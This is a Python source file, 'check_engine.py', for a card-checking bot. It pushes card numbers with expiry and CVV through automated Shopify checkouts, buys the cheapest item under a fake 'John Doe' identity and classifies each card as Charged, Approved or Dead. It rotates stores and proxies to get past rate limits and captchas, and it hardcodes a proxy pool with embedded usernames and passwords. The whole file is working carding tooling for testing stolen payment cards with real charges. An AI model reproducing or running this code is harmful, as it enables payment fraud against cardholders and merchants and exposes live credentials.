"""
check_engine.py — Card checking engine
If CHECKER_API_URL is configured in bot_config.json, calls that external API.
Otherwise falls back to direct Shopify checkout flow.
"""
import asyncio
import aiohttp
import random
import re
import os
import json
import logging

log = logging.getLogger(__name__)

_BOT_CONFIG_FILE = os.path.join(os.path.dirname(__file__), "bot_config.json")

def _get_checker_api_urls() -> list[str]:
    """Read checker API URLs from bot_config.json. Supports both list and single-string formats."""
    try:
        with open(_BOT_CONFIG_FILE) as f:
            data = json.load(f)
        # New format: list
        urls = data.get("checker_api_urls", [])
        if isinstance(urls, list):
            return [u.strip() for u in urls if u and u.strip()]
        # Legacy format: single string
        url = data.get("checker_api_url", "").strip()
        return [url] if url else []
    except Exception:
        return []

# ─── Built-in proxy pool ───────────────────────────────────────────────────────
_BUILTIN_PROXIES = [
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@cz-pra.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@nz-auc.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@co-bog.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@il-tel.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hu-bud.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ro-buk.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ie-dub.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fi-esp.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@jp-tok.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@se-sto.pvdata.host:8080",
    "http://OR1673915314:LMf4JcDV@208.196.99.128:8813",
    "http://naveed:Qwerty_123ABC@196.244.48.124:12345",
    "http://1352:23CfS1Bz7oF0@p101.squidproxies.com:9094",
]

_ROTATION_RESPONSES = [
    "r4 token empty", "payment method is not shopify", "r2 id empty",
    "product not found", "hcaptcha detected", "tax ammount empty",
    "product id is empty", "no valid products", "not shopify",
    "failed to get token", "failed to get checkout", "captcha at checkout",
    "site not supported", "site error", "no products", "login required",
    "sold out", "unavailable",
]

_session_bad_sites: set = set()

def clear_session_bad_sites():
    global _session_bad_sites
    _session_bad_sites = set()


# ─── Helpers ───────────────────────────────────────────────────────────────────

def _make_result(card, status, message, price="-", gateway="Shopify Payments",
                 receipt_url="", retryable=False, proxy="", time=None):
    return {
        "status":      status,
        "message":     message,
        "card":        card,
        "gateway":     gateway,
        "price":       price,
        "receipt_url": receipt_url,
        "retry":       retryable,
        "proxy":       proxy,
        "time":        time,
    }

def _proxy_to_url(proxy: str) -> str:
    p = proxy.strip()
    if not p:
        return ""
    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
        return p
    parts = p.split(":")
    if len(parts) == 2:
        return f"http://{p}"
    if len(parts) >= 4:
        host, port = parts[0], parts[1]
        rest = ":".join(parts[2:])
        mid = rest.rfind(":")
        return f"http://{rest[:mid]}:{rest[mid+1:]}@{host}:{port}"
    return f"http://{p}"

def _is_proxy_err(msg: str) -> bool:
    signals = ("connection timed out", "timed out", "proxy", "eof occurred",
               "remote end closed", "failed to perform", "connect call failed",
               "cannot connect", "connection refused")
    return any(s in msg.lower() for s in signals)

def _norm_url(url: str) -> str:
    if not url.startswith("http"):
        url = "https://" + url
    return url.rstrip("/")

_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
       "AppleWebKit/537.36 (KHTML, like Gecko) "
       "Chrome/124.0.0.0 Safari/537.36")


# ─── Core direct Shopify checker ───────────────────────────────────────────────

async def _shopify_direct(shop_url: str, card: str, proxy_raw: str) -> dict:
    """
    Full direct Shopify Payments checkout flow.
    Returns same shape as _make_result().
    """
    parts = card.split("|")
    if len(parts) < 4:
        return _make_result(card, "Dead", "Invalid card format")

    cc, mm, yy, cvv = parts[:4]
    yy_full = ("20" + yy) if len(yy) == 2 else yy

    shop = _norm_url(shop_url)
    proxy = _proxy_to_url(proxy_raw) if proxy_raw else None

    timeout   = aiohttp.ClientTimeout(total=35)
    connector = aiohttp.TCPConnector(ssl=False, limit=1)
    headers   = {
        "User-Agent": _UA,
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }

    try:
        async with aiohttp.ClientSession(
            timeout=timeout, connector=connector, headers=headers,
            cookie_jar=aiohttp.CookieJar(unsafe=True)
        ) as s:

            # ── Step 1: fetch a cheap/free product ────────────────────────────
            async with s.get(f"{shop}/products.json?limit=10", proxy=proxy, ssl=False) as r:
                if r.status != 200:
                    return _make_result(card, "Dead", f"site error! status: {r.status}", retryable=True)
                pdata = await r.json(content_type=None)

            products  = pdata.get("products", [])
            if not products:
                return _make_result(card, "Dead", "no valid products", retryable=True)

            variant_id = None
            best_price = 9999.0
            for prod in products:
                for v in prod.get("variants", []):
                    try:
                        p = float(str(v.get("price", "9999")).replace(",", ""))
                    except ValueError:
                        p = 9999.0
                    if p < best_price:
                        best_price  = p
                        variant_id  = v["id"]

            if not variant_id:
                return _make_result(card, "Dead", "no valid products", retryable=True)

            price_display = f"${best_price:.2f} USD" if best_price < 9999 else "N/A"

            # ── Step 2: add to cart ───────────────────────────────────────────
            async with s.post(
                f"{shop}/cart/add.js",
                json={"id": variant_id, "quantity": 1},
                proxy=proxy, ssl=False,
                headers={"Content-Type": "application/json", "Accept": "application/json"},
            ) as r:
                if r.status not in (200, 201):
                    return _make_result(card, "Dead", "failed to get checkout", retryable=True)

            # ── Step 3: initiate checkout ─────────────────────────────────────
            async with s.post(
                f"{shop}/cart/checkout",
                allow_redirects=True, proxy=proxy, ssl=False,
                headers={"Accept": "text/html"},
            ) as r:
                checkout_url  = str(r.url)
                checkout_html = await r.text()

            if "checkouts" not in checkout_url:
                return _make_result(card, "Dead", "failed to get checkout", retryable=True)

            auth_match = re.search(r'name="authenticity_token"[^>]*value="([^"]+)"', checkout_html)
            auth_token = auth_match.group(1) if auth_match else ""

            # ── Step 4: fill contact + shipping address ───────────────────────
            rand_email = f"johndoe{random.randint(10000,99999)}@gmail.com"
            contact_data = {
                "_method": "patch",
                "authenticity_token": auth_token,
                "button": "",
                "checkout[email]":                          rand_email,
                "checkout[shipping_address][first_name]":  "John",
                "checkout[shipping_address][last_name]":   "Doe",
                "checkout[shipping_address][address1]":    "123 Main Street",
                "checkout[shipping_address][city]":        "New York",
                "checkout[shipping_address][country]":     "United States",
                "checkout[shipping_address][province]":    "New York",
                "checkout[shipping_address][zip]":         "10001",
                "checkout[shipping_address][phone]":       "5555550100",
            }
            async with s.post(
                checkout_url, data=contact_data,
                allow_redirects=True, proxy=proxy, ssl=False,
                headers={"Content-Type": "application/x-www-form-urlencoded",
                         "Accept": "text/html"},
            ) as r:
                shipping_html = await r.text()
                shipping_url  = str(r.url)

            # ── Step 5: select shipping rate ──────────────────────────────────
            rate_match = re.search(
                r'name="checkout\[shipping_rate\]\[id\]"[^>]*value="([^"]+)"',
                shipping_html
            )
            if rate_match:
                ship_data = {
                    "_method": "patch",
                    "authenticity_token": auth_token,
                    "button": "",
                    "checkout[shipping_rate][id]": rate_match.group(1),
                }
                async with s.post(
                    shipping_url, data=ship_data,
                    allow_redirects=True, proxy=proxy, ssl=False,
                    headers={"Content-Type": "application/x-www-form-urlencoded",
                             "Accept": "text/html"},
                ) as r:
                    payment_html = await r.text()
                    payment_url  = str(r.url)
            else:
                payment_html = shipping_html
                payment_url  = shipping_url

            # ── Step 6: tokenize card via Shopify Payments vault ──────────────
            vault_url  = "https://elb.deposit.shopifycs.com/sessions"
            vault_body = {
                "credit_card": {
                    "number":             cc,
                    "name":               "John Doe",
                    "month":              int(mm),
                    "year":               int(yy_full),
                    "verification_value": cvv,
                }
            }
            async with s.post(
                vault_url, json=vault_body, proxy=proxy, ssl=False,
                headers={"Content-Type": "application/json",
                         "Accept": "application/json"},
            ) as r:
                if r.status != 200:
                    return _make_result(card, "Dead",
                                        f"Vault error: {r.status}", retryable=False)
                vdata      = await r.json(content_type=None)
                card_token = vdata.get("id")

            if not card_token:
                return _make_result(card, "Dead", "Card vault failed", retryable=False)

            # ── Step 7: submit payment ────────────────────────────────────────
            gw_match  = re.search(r'"payment_gateway_id"\s*:\s*(\d+)', payment_html)
            gw_id     = gw_match.group(1) if gw_match else ""
            price_raw = re.search(r'"total_price"\s*:\s*"?(\d+)"?', payment_html)
            total_p   = price_raw.group(1) if price_raw else ""

            pay_url = re.sub(r"/(shipping_method|contact_information)$", "/payment", payment_url)
            if "/payment" not in pay_url:
                pay_url = checkout_url.split("?")[0].rstrip("/") + "/payment"

            pay_data = {
                "_method":                          "patch",
                "authenticity_token":               auth_token,
                "checkout[payment_gateway]":        gw_id,
                "checkout[credit_card][vault]":     "false",
                "checkout[different_billing_address]": "false",
                "s":                                card_token,
                "checkout[total_price]":            total_p,
                "complete":                         "1",
                "button":                           "",
            }
            async with s.post(
                pay_url, data=pay_data,
                allow_redirects=True, proxy=proxy, ssl=False,
                headers={"Content-Type": "application/x-www-form-urlencoded",
                         "Accept": "text/html"},
            ) as r:
                result_html = await r.text()
                result_url  = str(r.url)

            # ── Step 8: classify result ───────────────────────────────────────
            low = result_html.lower()

            if any(k in low for k in ["thank_you", "thank you", "order_placed",
                                       "order_paid", "/orders/", "your order"]):
                return _make_result(card, "Charged", "Thank you / order_placed",
                                    price=price_display)

            if any(k in low for k in ["3d_secure", "3dsecure", "authentication_required",
                                       "3ds_required", "authentication needed"]):
                return _make_result(card, "Approved", "3DS Required",
                                    price=price_display)

            if "insufficient_funds" in low:
                return _make_result(card, "Approved", "Insufficient Funds",
                                    price=price_display)

            if "invalid_cvc" in low or "security code" in low:
                return _make_result(card, "Approved", "Invalid CVV / CCN",
                                    price=price_display)

            if any(k in low for k in ["do_not_honor", "card_declined", "declined"]):
                return _make_result(card, "Dead", "Declined")

            if any(k in low for k in ["card_number_invalid", "invalid card",
                                       "number is invalid"]):
                return _make_result(card, "Dead", "Invalid Card Number")

            if any(t in low for t in _ROTATION_RESPONSES):
                return _make_result(card, "Dead", "Site Error", retryable=True)

            # Unknown — treat as dead but don't log as proxy error
            snippet = result_html[2000:2200].replace("\n", " ").strip()[:80]
            return _make_result(card, "Dead", f"Unknown: {snippet}" if snippet else "Unknown response")

    except (asyncio.TimeoutError, aiohttp.ClientConnectorError) as e:
        return _make_result(card, "Dead", f"Connection error: {str(e)[:80]}", retryable=True)
    except Exception as e:
        log.debug(f"Shopify direct check error: {e}")
        return _make_result(card, "Dead", f"Error: {str(e)[:80]}", retryable=True)


# ─── Public API (same interface as before) ─────────────────────────────────────

# Responses that mean the site itself has an issue — rotate to next site
_SITE_ROTATE_SIGNALS = (
    "site error! status: 429",
    "site error! status: 5",
    "site error! status: 0",
    "timeout", "connection", "missing_site",
    "not shopify", "captcha", "hcaptcha",
    "login required", "no products", "sold out",
    "unavailable", "unknown",
)

# Responses that mean the card is dead — no retry needed
_CARD_DEAD_SIGNALS = (
    "declined", "do_not_honor", "card_declined",
    "invalid card", "invalid cc", "number is invalid",
    "card_number_invalid", "invalid cvc", "security code",
    "expired", "insufficient_funds",
)

async def _check_via_external_api(card: str, api_url: str, sites: list,
                                   proxies: list | None = None) -> dict:
    """
    Call the configured external checker API.
    Format: GET {api_url}?cc=CC|MM|YYYY|CVV&site=SITE_URL&proxy=PROXY_URL
    Passes a proxy per attempt so Shopify rate-limits won't block all checks.
    Response JSON: {Charged, Approved, Response, Gate, Site, Price, Time}
    """
    if not sites:
        return _make_result(card, "Dead", "No sites configured")

    # Normalize card to CC|MM|YYYY|CVV
    parts = card.split("|")
    if len(parts) < 4:
        return _make_result(card, "Dead", "Invalid card format")
    cc, mm, yy, cvv = parts[:4]
    yy_full = ("20" + yy) if len(yy) == 2 else yy
    card_fmt = f"{cc}|{mm}|{yy_full}|{cvv}"

    # Build proxy pool — user proxies only (strip backticks), no built-ins
    # External API expects raw host:port:user:pass format (no http:// prefix)
    raw_proxies: list[str] = []
    for p in (proxies or []):
        cleaned = p.strip().strip("`").strip()
        if cleaned:
            raw_proxies.append(cleaned)
    random.shuffle(raw_proxies)

    # Pick random sites — up to 10 attempts
    site_pool = list(sites)
    random.shuffle(site_pool)
    attempts = site_pool[:10]
    last_msg = "Site error"

    for i, site_url in enumerate(attempts):
        # Skip invalid URLs
        if not site_url.startswith("http"):
            continue

        # Rotate proxy each attempt (raw format for external API)
        proxy_raw = raw_proxies[i % len(raw_proxies)] if raw_proxies else ""

        params: dict = {"cc": card_fmt, "site": site_url}
        if proxy_raw:
            params["proxy"] = proxy_raw

        try:
            timeout = aiohttp.ClientTimeout(total=40)
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as s:
                async with s.get(
                    api_url,
                    params=params,
                    headers={"User-Agent": _UA, "Accept": "application/json"},
                    ssl=False,
                ) as r:
                    try:
                        data = await r.json(content_type=None)
                    except Exception:
                        text = await r.text()
                        last_msg = f"Bad API response: {text[:60]}"
                        await asyncio.sleep(0.3)
                        continue

            charged      = str(data.get("Charged", "")).strip().lower() == "true"
            approved     = str(data.get("Approved", "")).strip().lower() == "true"
            response_msg = str(data.get("Response", "")).strip()
            gate         = str(data.get("Gate", "Shopify")).strip() or "Shopify"
            price        = str(data.get("Price", "0.00")).strip()
            time_str     = str(data.get("Time", "")).strip()
            # Store raw price — cards.py will format it with $ and USD
            extra        = f" [{time_str}]" if time_str else ""
            resp_low     = response_msg.lower()

            # ── Definite hits ─────────────────────────────────────────────
            if charged:
                return _make_result(card, "Charged", response_msg + extra,
                                    price=price, gateway=gate, proxy=proxy_raw)
            if approved:
                return _make_result(card, "Approved", response_msg + extra,
                                    price=price, gateway=gate, proxy=proxy_raw)

            # ── Card definitively dead — stop immediately ──────────────────
            if any(sig in resp_low for sig in _CARD_DEAD_SIGNALS):
                return _make_result(card, "Dead", response_msg or "Declined")

            # ── Site / rate-limit error — rotate site + proxy ─────────────
            if resp_low.startswith("site error") or any(sig in resp_low for sig in _SITE_ROTATE_SIGNALS):
                last_msg = response_msg
                await asyncio.sleep(0.3)
                continue

            # ── Unknown — dead ────────────────────────────────────────────
            return _make_result(card, "Dead", response_msg or "Unknown")

        except (asyncio.TimeoutError, aiohttp.ClientConnectorError):
            last_msg = "Connection timeout"
            await asyncio.sleep(0.4)
            continue
        except Exception as e:
            log.debug(f"External API error: {e}")
            return _make_result(card, "Dead", f"API error: {str(e)[:60]}", retryable=True)

    return _make_result(card, "Dead", f"Site Error — {last_msg}")


async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy=None):
    """
    Check a card. If a checker API URL is configured in bot_config.json, use it.
    Otherwise falls back to direct Shopify checkout flow.
    Rotates sites and proxies on errors.
    Falls back to built-in proxies if none provided.
    """
    api_urls = _get_checker_api_urls()
    if api_urls:
        # Shuffle API list so load is distributed across both APIs
        shuffled_apis = list(api_urls)
        random.shuffle(shuffled_apis)
        for api_url in shuffled_apis:
            result = await _check_via_external_api(card, api_url, sites, proxies)
            # If site errors on all sites, try the next API
            msg = result.get("message", "")
            if result.get("status") == "Dead" and msg.startswith("Site Error"):
                continue
            return result
        # All APIs exhausted — return last result
        return result

    if not sites:
        return _make_result(card, "Dead", "No sites configured")

    effective_proxies = proxies if proxies else _BUILTIN_PROXIES
    failed_sites      = set()
    MAX_TRIES         = 8
    last_err          = "Unknown error"

    for attempt in range(MAX_TRIES):
        available = [s for s in sites if s not in failed_sites] or list(sites)
        shop_url  = random.choice(available)
        proxy_raw = (start_proxy if attempt == 0 and start_proxy
                     else random.choice(effective_proxies))

        result = await _shopify_direct(shop_url, card, proxy_raw)

        if result["status"] in ("Charged", "Approved"):
            result["proxy"] = proxy_raw
            return result

        if result["status"] == "Dead" and not result.get("retry"):
            return result

        last_err = result.get("message", "Retryable error")
        if _is_proxy_err(last_err):
            await asyncio.sleep(0.5)
            continue

        failed_sites.add(shop_url)
        await asyncio.sleep(0.3)

    _log_error_card(card, last_err)
    return _make_result(card, "Dead", last_err)


async def test_site(site: str, proxy: str) -> dict:
    """Test whether a Shopify site is reachable and has products."""
    shop = _norm_url(site)
    proxy_url = _proxy_to_url(proxy) if proxy else random.choice(_BUILTIN_PROXIES)
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as s:
            async with s.get(
                f"{shop}/products.json?limit=1",
                proxy=_proxy_to_url(proxy_url), ssl=False,
                headers={"User-Agent": _UA},
            ) as r:
                if r.status == 200:
                    data = await r.json(content_type=None)
                    if data.get("products"):
                        return {"site": site, "status": "alive"}
                return {"site": site, "status": "dead",
                        "msg": f"HTTP {r.status}"}
    except Exception as e:
        return {"site": site, "status": "dead", "msg": str(e)[:80]}


# Server's own IP — proxy is valid only if exit IP differs from this
_SERVER_IP = "34.93.107.98"

_IP_CHECK_URLS = [
    "https://api.ipify.org",
    "https://icanhazip.com",
    "https://checkip.amazonaws.com",
]

async def test_proxy(proxy: str) -> dict:
    """
    Strictly verify a proxy.
    1. Clean the proxy string (strip backticks, whitespace).
    2. Validate the URL is well-formed.
    3. Fetch an IP-check URL THROUGH the proxy and confirm the exit IP
       is different from the server's own IP — this proves the proxy
       is actually routing traffic, not just falling back to direct.
    Returns {'proxy': ..., 'status': 'alive'|'dead', 'ip': exit_ip_or_none}
    """
    # ── 1. Clean ─────────────────────────────────────────────────────────
    cleaned = proxy.strip().strip("`").strip()
    if not cleaned:
        return {"proxy": proxy, "status": "dead", "ip": None}

    proxy_url = _proxy_to_url(cleaned)
    if not proxy_url or proxy_url in ("http://", "https://", "http://:"):
        return {"proxy": proxy, "status": "dead", "ip": None}

    # ── 2. Try each IP-check URL through the proxy ────────────────────────
    timeout = aiohttp.ClientTimeout(connect=8, total=15)
    for check_url in _IP_CHECK_URLS:
        try:
            conn = aiohttp.TCPConnector(ssl=False, force_close=True)
            async with aiohttp.ClientSession(timeout=timeout, connector=conn) as s:
                async with s.get(
                    check_url,
                    proxy=proxy_url,
                    allow_redirects=True,
                    headers={"User-Agent": _UA},
                ) as r:
                    if r.status == 200:
                        exit_ip = (await r.text()).strip()
                        # ── 3. Confirm proxy actually routed the request ──
                        if exit_ip and exit_ip != _SERVER_IP:
                            return {"proxy": proxy, "status": "alive", "ip": exit_ip}
                        else:
                            # Same IP → proxy bypassed (dead/mis-configured)
                            return {"proxy": proxy, "status": "dead", "ip": None}
        except Exception:
            continue

    return {"proxy": proxy, "status": "dead", "ip": None}


async def get_proxy_ip(proxy: str) -> str | None:
    """Get exit IP of a proxy (reuses test_proxy result for efficiency)."""
    result = await test_proxy(proxy)
    return result.get("ip")


# ─── Error log ─────────────────────────────────────────────────────────────────

def clear_error_log():
    try:
        open(os.path.join(os.path.dirname(__file__), "error.txt"), "w").close()
    except Exception:
        pass

def _log_error_card(card: str, reason: str):
    try:
        path = os.path.join(os.path.dirname(__file__), "error.txt")
        with open(path, "a", encoding="utf-8") as f:
            f.write(f"{card}  # {reason[:100]}\n")
    except Exception:
        pass
